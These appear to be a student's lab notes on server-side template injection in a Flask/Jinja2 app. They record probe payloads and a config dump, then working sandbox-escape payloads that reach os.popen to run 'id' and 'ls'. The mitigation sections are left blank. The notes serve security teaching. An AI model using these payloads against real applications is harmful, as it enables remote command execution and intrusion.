# Assignment Notes - SSTI Lesson

Use this file to track your progress through each assignment.  
You can record observations, payloads, successes, errors, and bypass techniques.

---

## Assignment 01 - Discovering and Exploiting SSTI

- **Tested Payloads**:
  - {{ 7*7 }}
- **Server Behavior**:
  - 49
- **Confirmed Vulnerability**:
  - yes
- **Tested Payloads**:
  - {{ 7*"7" }}
- **Server Behavior**:
  - 7777777
- **Confirmed Vulnerability**:
  - yes
- **Tested Payloads**:
  - {{ 7>4 }}
- **Server Behavior**:
  - True
- **Confirmed Vulnerability**:
  - yes
- **Tested Payloads**:
  - {{ config.items() }}
- **Server Behavior**:
  - dict_items([('DEBUG', True), ('TESTING', False), ('PROPAGATE_EXCEPTIONS', None), ('SECRET_KEY', None), ('SECRET_KEY_FALLBACKS', None), ('PERMANENT_SESSION_LIFETIME', datetime.timedelta(days=31)), ('USE_X_SENDFILE', False), ('TRUSTED_HOSTS', None), ('SERVER_NAME', None), ('APPLICATION_ROOT', '/'), ('SESSION_COOKIE_NAME', 'session'), ('SESSION_COOKIE_DOMAIN', None), ('SESSION_COOKIE_PATH', None), ('SESSION_COOKIE_HTTPONLY', True), ('SESSION_COOKIE_SECURE', False), ('SESSION_COOKIE_PARTITIONED', False), ('SESSION_COOKIE_SAMESITE', None), ('SESSION_REFRESH_EACH_REQUEST', True), ('MAX_CONTENT_LENGTH', None), ('MAX_FORM_MEMORY_SIZE', 500000), ('MAX_FORM_PARTS', 1000), ('SEND_FILE_MAX_AGE_DEFAULT', None), ('TRAP_BAD_REQUEST_ERRORS', None), ('TRAP_HTTP_EXCEPTIONS', False), ('EXPLAIN_TEMPLATE_LOADING', False), ('PREFERRED_URL_SCHEME', 'http'), ('TEMPLATES_AUTO_RELOAD', None), ('MAX_COOKIE_SIZE', 4093), ('PROVIDE_AUTOMATIC_OPTIONS', True)])!
- **Confirmed Vulnerability**:
  - yes
---

## Assignment 02 - Advanced Payloads and Bypassing Filters

- **Advanced Payloads Used**:
  - {{ ''.__class__.__base__.__subclasses__() }}
  - {{ self.__init__.__globals__.__builtins__ }}
  - {{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
  - {% for x in ().__class__.__base__.__subclasses__() %}{% if "warning" in x.__name__ %}{{x()._module.__builtins__['__import__']('os').popen('ls').read()}}{%endif%}{%endfor%}
- **Accessed Internal Objects**:
  - Found 'config' object through {{ config }} payload
  - Found 'cycler', 'joiner', and 'namespace' available and inspected its __globals__
  - Accessed os module via config.__class__.__init__.__globals__['os']
- **Command Execution Achieved**:
  - ls, id

---

## Assignment 03 - Mitigating SSTI Vulnerabilities

- **Changes Made to Flask App**:
  - 
- **Testing Results**:
  - 
- **Mitigation Explanation**:
  - 

---

## Bonus Challenge - No Braces Allowed

- **Non-Brace Payload Attempts**:
  - 
- **Successes and Failures**:
  - 
- **Creative Techniques Explored**:
  - 

---

## General Notes and Ideas

- 

